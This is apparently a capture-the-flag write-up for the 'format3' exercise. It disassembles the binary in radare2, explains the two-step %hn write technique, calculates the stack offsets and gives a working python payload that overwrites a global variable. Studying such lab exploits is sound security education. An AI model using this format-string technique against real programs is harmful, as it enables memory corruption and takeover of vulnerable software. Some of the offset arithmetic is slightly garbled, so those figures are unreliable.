New vulnerable program, format3, this time it says that we will have to write more than 1 or 2 bytes.
Probably we will have to write in two steps, if we remember previous challenge, we wrote to a pointer with %n, but it's not possible to write maybe directly a value of 4 bytes (long number).
We will have to write in 2 rounds of 2 bytes, using %hn. We'll see what algorithm to use, first let's open the binary in radare2 to analyze it:

    $ radare2 ./format3
    > aaa
    > afl
    > s main
    > pdf

Again we have a main function that the only thing it does is to call the function sym.vuln. So let's check it:

    > s sym.vuln
    > pdf
    > afvn buffer s

First thing it does is to call fgets, with a buffer of size 512 bytes, then that buffer is given to a function sym.printbuffer as parameter, then a global value obj.target is compared against 0x01025544, if we have a way to modify that variable, we will see a message with "you have modified the target :)". Let's gonna see now the method sym.printbuffer:

    > s sym.printbuffer
    > pdf
    > afvn buffer format
    > pdf

We can see this function calls directly printf with our buffer given as parameter, the printf call is in the address 0x08048460. So here we can do a format string exploitation.

As the write has to be done in two steps, we will see which algorithm we'll follow. We'll separate the number checked in two parts of two bytes: 0x0102 (HOB) and 0x5544 (LOB). Now we'll see what to write and how to write two bytes and two bytes

if HOB > LOB:
    [address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]\$hn

Here we put first the [address + 2] to access to it as offset, this will be the HOB address. Then the address, that we will access as offset+1. We've written with this 8 bytes, so we will write the value of LOB -8, and we will write it to [offset+1] that it is [address]. Then we need to write the difference of HOB - LOB to have the HOB number of bytes to [offset] that points [address+2]

else if HOB < LOB:
    [address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]\$hn

Now is the inverse of before.

In this case we have that LOB (0x5544) is greater than HOB (0x0102), so let's calculate the other values.

    LOB = 0x5544 = 21828
    HOB = 0x0102 = 258
    HOB - 8 = 258 - 8 = 250
    LOB - HOB = 21828 - 258 = 21570
    address = 0x080496f4 (obj.target)
    address + 2 = 0x080496f6
    offset = 0xbffffef20 - 0xbfffeef0 = 0x30 / 4 = 0xC = 12
    offset + 1 = 13

So we will write something like:

    $ python -c 'print "\xf6\x96\x04\x08" + "\xf4\x96\x04\x08" + "%.250x%12$hn" + "%.21570x%13$hn"' | ./format3
    ...
    you have modified the target :)

So exploited, now we know how to calculate the offset, how to include a lot of data if necessary with string format, and how to write in shorts insteads of long number by address.
